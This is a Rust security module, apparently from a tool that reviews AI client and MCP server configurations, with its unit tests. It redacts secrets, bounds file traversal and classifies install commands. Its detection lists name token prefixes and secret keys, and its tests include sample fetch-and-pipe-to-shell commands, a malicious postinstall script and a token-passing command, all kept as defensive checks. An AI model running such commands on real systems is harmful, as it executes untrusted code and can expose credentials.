//! Read-only security primitives: secret redaction, bounded reads and symlink containment.
//! Nothing here executes a client, a command or third-party code.

use crate::integrations::model::ScanIssue;
use serde::Serialize;
use serde_json::{Map, Value};
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};

const SECRET_MARKERS: [&str; 11] = [
    "apikey", "token", "secret", "passw", "credential", "authorization", "cookie", "session",
    "privatekey", "accesskey", "clientsecret",
];
const TOKEN_PREFIXES: [&str; 7] = ["sk-", "ghp_", "github_pat_", "xoxb-", "xoxp-", "AKIA", "AIza"];
const ASSIGNMENTS: [&str; 8] = ["password=", "password:", "token=", "token:", "secret=", "secret:", "api_key=", "apikey:"];

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Limits {
    pub max_depth: usize,
    pub max_bytes: u64,
}

impl Default for Limits {
    fn default() -> Self { Self { max_depth: 16, max_bytes: 1024 * 1024 } }
}

#[derive(Debug, Default)]
pub struct Walk {
    pub files: Vec<PathBuf>,
    pub issues: Vec<ScanIssue>,
}

pub fn is_secret_key(name: &str) -> bool {
    let normalized = name.chars().filter(|c| c.is_ascii_alphanumeric()).flat_map(char::to_lowercase).collect::<String>();
    SECRET_MARKERS.iter().any(|marker| normalized.contains(marker))
}

fn is_reference(value: &str) -> bool {
    let value = value.trim();
    (value.starts_with("${") && value.ends_with('}')) || (value.starts_with('%') && value.ends_with('%'))
        || (value.starts_with('$') && value.len() > 1 && value[1..].chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
}

/// Redact secret-looking values while keeping environment references such as `${DATABASE_URL}` readable.
pub fn redact_text(text: &str) -> String {
    if is_reference(text) { return text.to_string(); }
    let mut out = text.to_string();
    for prefix in TOKEN_PREFIXES { out = redact_tokens(&out, prefix, true); }
    out = redact_tokens(&out, "bearer ", false);
    for assignment in ASSIGNMENTS { out = redact_tokens(&out, assignment, false); }
    out
}

pub fn redact_json(value: &Value) -> Value {
    match value {
        Value::Object(map) => {
            let mut redacted = Map::new();
            for (key, value) in map {
                let next = if is_secret_key(key) {
                    match value.as_str() {
                        Some(text) if is_reference(text) => Value::String(text.to_string()),
                        _ => Value::String("[redacted]".into()),
                    }
                } else {
                    redact_json(value)
                };
                redacted.insert(key.clone(), next);
            }
            Value::Object(redacted)
        }
        Value::Array(items) => Value::Array(items.iter().map(redact_json).collect()),
        Value::String(text) => Value::String(redact_text(text)),
        other => other.clone(),
    }
}

/// Malformed configs are replaced with a fixed marker instead of showing a value we could not classify.
pub fn redact_json_str(text: &str) -> String {
    serde_json::from_str::<Value>(text).map(|value| redact_json(&value).to_string()).unwrap_or_else(|_| "[unparseable config]".into())
}

/// What a source review proves: nothing about safety. It only lists observable facts and warnings, and every
/// executable install path still needs an explicit user preview and approval.
pub const REVIEW_NOTE: &str = "Statik inceleme yalnızca uyarıdır; bu etiket güvenlik garantisi vermez. Kurulum komutları yalnızca kullanıcı önizlemesi ve açık onayından sonra çalıştırılabilir.";

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity { Unknown, Review, High }

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum DigestStatus { Match, Mismatch, Unknown }

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum CommandClass { RemoteShell, PackageRunner, HookScript, Installer, Unknown }

#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct CommandReview { pub command: String, pub class: CommandClass, pub reasons: Vec<String> }

#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct PermissionReview { pub name: String, pub class: &'static str }

#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
pub struct RiskReview {
    pub source_host: Option<String>,
    pub publisher: Option<String>,
    pub package_digest: Option<String>,
    pub digest_status: DigestStatus,
    pub commands: Vec<CommandReview>,
    pub permissions: Vec<PermissionReview>,
    pub permissions_status: &'static str,
    pub warnings: Vec<String>,
    pub severity: Severity,
    pub approval_required: bool,
    pub note: &'static str,
}

pub struct SourceReviewInput<'a> {
    pub source_url: &'a str,
    pub publisher: Option<&'a str>,
    pub declared_digest: Option<&'a str>,
    pub observed_digest: Option<&'a str>,
    pub install_commands: &'a [String],
    pub permissions: &'a [String],
    pub manifest: Option<&'a str>,
}

fn host_of(url: &str) -> Option<&str> {
    url.split("://").nth(1)?.split(['/', '?', '#']).next()
}

fn source_redirects(url: &str) -> bool {
    let Some(path) = url.strip_prefix("https://github.com/") else { return false };
    let mut parts = path.split(['?', '#']).next().unwrap_or(path).split('/');
    parts.next();
    parts.next();
    parts.next().is_some() || url.contains('?') || url.contains('#')
}

fn word_tokens(command: &str) -> Vec<String> {
    command.split(|c: char| !c.is_ascii_alphanumeric() && c != '-' && c != '_')
        .filter(|token| !token.is_empty()).map(str::to_ascii_lowercase).collect()
}

fn fetches_shell(command: &str) -> bool {
    if !(command.contains("curl") || command.contains("wget")) { return false; }
    command.split('|').skip(1).any(|part| {
        matches!(part.trim().split_whitespace().next().unwrap_or("").to_ascii_lowercase().as_str(), "sh" | "bash" | "zsh" | "pwsh" | "powershell")
    })
}

fn secret_reference(command: &str) -> bool {
    let mut rest = command;
    while let Some(start) = rest.find('$') {
        rest = &rest[start + 1..];
        let name = rest.trim_start_matches('{').split(|c: char| !c.is_ascii_alphanumeric() && c != '_').next().unwrap_or("");
        if !name.is_empty() && is_secret_key(name) { return true; }
    }
    false
}

fn classify_command(command: &str) -> (CommandClass, Vec<String>) {
    let lower = command.to_ascii_lowercase();
    let tokens = word_tokens(&lower);
    let mut reasons = Vec::new();
    let mut class = CommandClass::Unknown;
    if fetches_shell(&lower) {
        class = CommandClass::RemoteShell;
        reasons.push("remote_shell_pipe".into());
    } else if tokens.iter().any(|token| matches!(token.as_str(), "npx" | "bunx" | "uvx" | "uv") || lower.contains("pnpm dlx")) {
        class = CommandClass::PackageRunner;
        reasons.push("package_runner".into());
    } else if tokens.iter().any(|token| matches!(token.as_str(), "bash" | "sh" | "zsh" | "pwsh" | "powershell"))
        || [".sh", ".ps1", ".bat", ".cmd"].iter().any(|suffix| lower.trim_end_matches(['"', '\'']).ends_with(suffix)) {
        class = CommandClass::HookScript;
        reasons.push("script_hook".into());
    } else if lower.contains("npm install") || lower.contains("pip install") || lower.contains("cargo install")
        || tokens.iter().any(|token| matches!(token.as_str(), "winget" | "choco" | "brew" | "apt")) {
        class = CommandClass::Installer;
        reasons.push("package_installer".into());
    }
    if lower.contains("$(") || lower.contains('`') || lower.contains("&&") || lower.contains(';') {
        reasons.push("embedded_command".into());
    }
    if secret_reference(&lower) {
        reasons.push("secret_environment".into());
    }
    (class, reasons)
}

fn permission_class(name: &str) -> &'static str {
    let lower = name.to_ascii_lowercase();
    if is_secret_key(&lower) { return "secrets"; }
    if lower.contains("file") || lower.contains("disk") { return "filesystem"; }
    if lower.contains("network") || lower.contains("http") || lower.contains("socket") { return "network"; }
    if lower.contains("process") || lower.contains("exec") || lower.contains("shell") { return "process"; }
    if lower.contains("environment") || lower == "env" || lower.starts_with("env:") { return "environment"; }
    if lower.contains("browser") || lower.contains("clipboard") {
        return if lower.contains("browser") { "browser" } else { "clipboard" };
    }
    "unknown"
}

fn manifest_warnings(manifest: &str) -> Vec<String> {
    let lower = manifest.to_ascii_lowercase();
    let mut warnings = Vec::new();
    if lower.contains("\"postinstall\"") || lower.contains("\"preinstall\"") || lower.contains("\"scripts\"") || lower.contains("\"command\"") {
        warnings.push("manifest_embedded_command".into());
    }
    if lower.contains("$(") || lower.contains('`') || lower.contains("&&") || lower.contains(';') || lower.contains('|') {
        warnings.push("manifest_shell_chaining".into());
    }
    warnings
}

/// Static, offline source review. It never executes a command, never downloads a package and never labels a source
/// as safe. Missing facts stay `unknown` instead of being guessed.
pub fn review_source(input: &SourceReviewInput) -> RiskReview {
    let mut warnings = Vec::new();
    let mut high = false;
    if !crate::integrations::catalog::is_verified_source_url(input.source_url) {
        warnings.push("source_host_unverified".into());
        high = true;
    } else if source_redirects(input.source_url) {
        warnings.push("source_redirect".into());
    }
    let digest_status = match (input.declared_digest, input.observed_digest) {
        (Some(declared), Some(observed)) if declared.eq_ignore_ascii_case(observed) => DigestStatus::Match,
        (Some(_), Some(_)) => { warnings.push("digest_mismatch".into()); high = true; DigestStatus::Mismatch }
        _ => { warnings.push("digest_unknown".into()); DigestStatus::Unknown }
    };
    if let Some(manifest) = input.manifest { warnings.extend(manifest_warnings(manifest)); }
    let mut commands = Vec::new();
    for command in input.install_commands {
        let (class, reasons) = classify_command(command);
        if reasons.iter().any(|reason| reason == "remote_shell_pipe" || reason == "embedded_command") { high = true; }
        for reason in &reasons { warnings.push(reason.clone()); }
        let mut redacted = redact_text(command);
        if redacted.chars().count() > 300 { redacted = redacted.chars().take(300).collect::<String>() + "…"; }
        commands.push(CommandReview { command: redacted, class, reasons });
    }
    let permissions_status = if input.permissions.is_empty() { "unknown" } else { "declared" };
    let permissions: Vec<_> = input.permissions.iter().map(|name| PermissionReview {
        name: name.clone(), class: permission_class(name),
    }).collect();
    if permissions.iter().any(|permission| permission.class == "unknown") { warnings.push("permission_unknown".into()); }
    if permissions.iter().any(|permission| permission.class == "secrets") { warnings.push("secret_permission".into()); }
    warnings.sort();
    warnings.dedup();
    let severity = if high { Severity::High }
        else if !commands.is_empty() || !permissions.is_empty() || input.manifest.is_some() { Severity::Review }
        else { Severity::Unknown };
    RiskReview {
        source_host: host_of(input.source_url).map(str::to_string),
        publisher: input.publisher.map(str::to_string),
        package_digest: input.declared_digest.map(str::to_string),
        digest_status,
        commands,
        permissions,
        permissions_status,
        warnings,
        severity,
        approval_required: true,
        note: REVIEW_NOTE,
    }
}

pub fn read_text(path: &Path, limits: Limits) -> Result<String, ScanIssue> {
    let size = fs::metadata(path).map(|meta| meta.len()).map_err(|error| issue("unreadable", path, error.to_string()))?;
    if size > limits.max_bytes { return Err(issue("too_large", path, format!("{size} bytes exceeds {}", limits.max_bytes))); }
    let bytes = fs::read(path).map_err(|error| issue("unreadable", path, error.to_string()))?;
    String::from_utf8(bytes).map_err(|error| issue("invalid_utf8", path, error.to_string()))
}

/// Bounded, non-following traversal. Symlinks are followed only inside the canonical root;
/// escapes, loops, unreadable folders and depth overruns become explicit issues.
pub fn walk_files(root: &Path, limits: Limits) -> Walk {
    let mut walk = Walk::default();
    let canonical_root = match fs::canonicalize(root) {
        Ok(path) => path,
        Err(error) => {
            walk.issues.push(issue("unreadable", root, error.to_string()));
            return walk;
        }
    };
    let mut visited = HashSet::from([canonical_root.clone()]);
    let mut stack = vec![(root.to_path_buf(), 0usize)];
    while let Some((directory, depth)) = stack.pop() {
        if depth > limits.max_depth {
            walk.issues.push(issue("too_deep", &directory, format!("depth {depth} exceeds {}", limits.max_depth)));
            continue;
        }
        let entries = match fs::read_dir(&directory) {
            Ok(entries) => entries,
            Err(error) => {
                walk.issues.push(issue("unreadable", &directory, error.to_string()));
                continue;
            }
        };
        for entry in entries {
            let entry = match entry {
                Ok(entry) => entry,
                Err(error) => {
                    walk.issues.push(issue("unreadable", &directory, error.to_string()));
                    continue;
                }
            };
            let path = entry.path();
            let metadata = match fs::symlink_metadata(&path) {
                Ok(metadata) => metadata,
                Err(error) => {
                    walk.issues.push(issue("unreadable", &path, error.to_string()));
                    continue;
                }
            };
            if metadata.file_type().is_symlink() {
                match fs::canonicalize(&path) {
                    Ok(target) if !target.starts_with(&canonical_root) => {
                        walk.issues.push(issue("symlink_escape", &path, target.display().to_string()));
                    }
                    Ok(target) if target.is_dir() => {
                        if !visited.insert(target.clone()) {
                            walk.issues.push(issue("symlink_loop", &path, target.display().to_string()));
                        } else {
                            stack.push((path, depth + 1));
                        }
                    }
                    Ok(_) => walk.files.push(path),
                    Err(error) => walk.issues.push(issue("symlink_unresolved", &path, error.to_string())),
                }
            } else if metadata.is_dir() {
                stack.push((path, depth + 1));
            } else {
                walk.files.push(path);
            }
        }
    }
    walk
}

fn redact_tokens(text: &str, marker: &str, include_marker: bool) -> String {
    let marker = marker.to_ascii_lowercase();
    let lower = text.to_ascii_lowercase();
    let mut output = String::new();
    let mut cursor = 0usize;
    let mut search = 0usize;
    while let Some(relative) = lower[search..].find(&marker) {
        let start = search + relative;
        let value_start = if include_marker { start } else { start + marker.len() };
        let mut end = value_start;
        while end < text.len() {
            let next = text[end..].chars().next().unwrap();
            if next.is_whitespace() || matches!(next, '"' | '\'' | ',' | '}' | ']' | ';' | ')') { break; }
            end += next.len_utf8();
        }
        if end == value_start {
            search = start + marker.len();
            continue;
        }
        output.push_str(&text[cursor..if include_marker { start } else { start + marker.len() }]);
        output.push_str("[redacted]");
        cursor = end;
        search = end;
    }
    output.push_str(&text[cursor..]);
    output
}

fn issue(code: &str, path: &Path, message: String) -> ScanIssue {
    ScanIssue { code: code.into(), message, source_path: Some(path.to_string_lossy().into_owned()) }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::integrations::model::{Owner, Source, SourceFormat};
    use serde_json::json;
    use std::time::{SystemTime, UNIX_EPOCH};

    struct Temp(PathBuf);
    impl Temp {
        fn new(label: &str) -> Self {
            let nanos = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos();
            let path = std::env::temp_dir().join(format!("hub-security-{label}-{}-{nanos}", std::process::id()));
            fs::create_dir_all(&path).unwrap();
            Self(path)
        }
    }
    impl Drop for Temp { fn drop(&mut self) { let _ = fs::remove_dir_all(&self.0); } }

    #[test]
    fn known_secret_values_are_redacted_but_references_survive() {
        let config = json!({
            "mcpServers": { "postgres": { "env": {
                "API_KEY": "sk-live-1234567890",
                "GITHUB_TOKEN": "ghp_abcdef",
                "PASSWORD": "hunter2",
                "DATABASE_URL": "${DATABASE_URL}",
                "NORMAL": "visible"
            }}},
            "authorization": "Bearer abc.def",
            "client_secret": "top-secret"
        });
        let text = redact_json(&config).to_string();
        for leaked in ["sk-live-1234567890", "ghp_abcdef", "hunter2", "abc.def", "top-secret"] {
            assert!(!text.contains(leaked), "leaked {leaked}: {text}");
        }
        assert!(text.contains("${DATABASE_URL}") && text.contains("visible"), "{text}");
        assert!(redact_text("password=hunter2 token: sk-live-xyz").contains("[redacted]"));
    }

    #[test]
    fn malformed_config_never_echoes_an_unclassified_value() {
        assert_eq!(redact_json_str(r#"{"token":"sk-live-abc""#), "[unparseable config]");
        assert_eq!(redact_json_str(r#"{"token":"hunter2""#), "[unparseable config]");
    }

    #[test]
    fn source_identity_and_ownership_survive_serialization() {
        let source = Source::from_path(Path::new("C:\\Users\\Demo User\\.claude.json"), Owner::Unknown, SourceFormat::Json);
        let value = serde_json::to_value(source).unwrap();
        assert_eq!(value["owner"]["kind"], "unknown");
        assert!(!value["path_id"].as_str().unwrap().is_empty());
        assert!(value["path"].as_str().unwrap().contains("Demo User"));
    }

    #[test]
    fn oversized_files_and_deep_folders_report_limits() {
        let root = Temp::new("limits");
        fs::write(root.0.join("large.json"), vec![b'x'; 32]).unwrap();
        assert_eq!(read_text(&root.0.join("large.json"), Limits { max_depth: 2, max_bytes: 8 }).unwrap_err().code, "too_large");
        let mut deep = root.0.clone();
        for _ in 0..4 { deep = deep.join("d"); fs::create_dir_all(&deep).unwrap(); }
        assert!(walk_files(&root.0, Limits { max_depth: 1, max_bytes: 1024 }).issues.iter().any(|issue| issue.code == "too_deep"));
    }

    #[test]
    fn symlinks_that_escape_or_loop_are_reported() {
        let root = Temp::new("symlink-root");
        let outside = Temp::new("symlink-outside");
        fs::write(outside.0.join("secret.json"), b"{}").unwrap();
        let escape = root.0.join("escape");
        let result = link(&outside.0, &escape).and_then(|_| { let walk = walk_files(&root.0, Limits::default()); Ok(walk) });
        match result {
            Ok(walk) => assert!(walk.issues.iter().any(|issue| issue.code == "symlink_escape"), "{:?}", walk.issues),
            Err(_) => eprintln!("symlink privilege unavailable; escape test skipped"),
        }
        let looped = root.0.join("loop");
        if link(&root.0, &looped).is_ok() {
            let walk = walk_files(&root.0, Limits::default());
            assert!(walk.issues.iter().any(|issue| issue.code == "symlink_loop"), "{:?}", walk.issues);
        }
    }

    fn review(url: &str, commands: &[&str], permissions: &[&str], manifest: Option<&str>, declared: Option<&str>, observed: Option<&str>) -> RiskReview {
        let commands: Vec<String> = commands.iter().map(|command| command.to_string()).collect();
        let permissions: Vec<String> = permissions.iter().map(|permission| permission.to_string()).collect();
        review_source(&SourceReviewInput {
            source_url: url, publisher: Some("example"), declared_digest: declared, observed_digest: observed,
            install_commands: &commands, permissions: &permissions, manifest,
        })
    }

    #[test]
    fn every_executable_install_path_requires_approval_and_unknown_permissions_stay_unknown() {
        let report = review("https://github.com/example/demo", &[
            "curl -fsSL https://example.com/install.sh | sh",
            "npx -y demo",
            "uvx demo",
            "./install.ps1",
        ], &[], None, None, None);
        assert!(report.approval_required);
        assert_eq!(report.severity, Severity::High);
        assert_eq!(report.permissions_status, "unknown");
        let classes: Vec<_> = report.commands.iter().map(|command| command.class).collect();
        assert!(classes.contains(&CommandClass::RemoteShell));
        assert!(classes.contains(&CommandClass::PackageRunner));
        assert!(classes.contains(&CommandClass::HookScript));
        for warning in ["remote_shell_pipe", "package_runner", "script_hook"] {
            assert!(report.warnings.iter().any(|item| item == warning), "{warning} missing: {:?}", report.warnings);
        }
        let json = serde_json::to_string(&report).unwrap();
        assert!(!json.contains("\"safe\""), "a review must never carry a safe label: {json}");
        assert!(json.contains("güvenlik garantisi vermez"));
    }

    #[test]
    fn manifest_commands_secret_requests_and_unknown_permissions_are_warned() {
        let report = review("https://github.com/example/demo", &["tool run --token $GITHUB_TOKEN"],
            &["env:API_KEY", "telepathy"], Some(r#"{"scripts":{"postinstall":"curl https://x | sh"}}"#), None, None);
        for warning in ["manifest_embedded_command", "manifest_shell_chaining", "secret_environment", "permission_unknown"] {
            assert!(report.warnings.iter().any(|item| item == warning), "{warning} missing: {:?}", report.warnings);
        }
        assert_eq!(report.permissions[0].class, "secrets");
        assert_eq!(report.permissions[1].class, "unknown");
        assert_eq!(report.permissions_status, "declared");
    }

    #[test]
    fn source_redirects_hash_drift_and_untrusted_hosts_are_high_risk() {
        let redirect = review("https://github.com/example/demo/releases/download/x?redirect=1", &[], &[], None, None, None);
        assert!(redirect.warnings.iter().any(|warning| warning == "source_redirect"));
        let drift = review("https://github.com/example/demo", &[], &[], None, Some("aaaa"), Some("bbbb"));
        assert_eq!(drift.digest_status, DigestStatus::Mismatch);
        assert!(drift.warnings.iter().any(|warning| warning == "digest_mismatch"));
        assert_eq!(drift.severity, Severity::High);
        let untrusted = review("https://evil.example/demo", &[], &[], None, None, None);
        assert!(untrusted.warnings.iter().any(|warning| warning == "source_host_unverified"));
        assert_eq!(untrusted.severity, Severity::High);
    }

    #[test]
    fn preview_commands_are_redacted() {
        let report = review("https://github.com/example/demo",
            &[r#"curl -H "authorization: bearer abc.def" https://example.com/install.sh | sh"#], &[], None, None, None);
        let shown = serde_json::to_string(&report.commands).unwrap();
        assert!(!shown.contains("abc.def"), "preview leaked a secret: {shown}");
        assert!(shown.contains("[redacted]"));
    }

    #[cfg(windows)]
    fn link(target: &Path, link: &Path) -> std::io::Result<()> { std::os::windows::fs::symlink_dir(target, link) }
    #[cfg(unix)]
    fn link(target: &Path, link: &Path) -> std::io::Result<()> { std::os::unix::fs::symlink(target, link) }
}
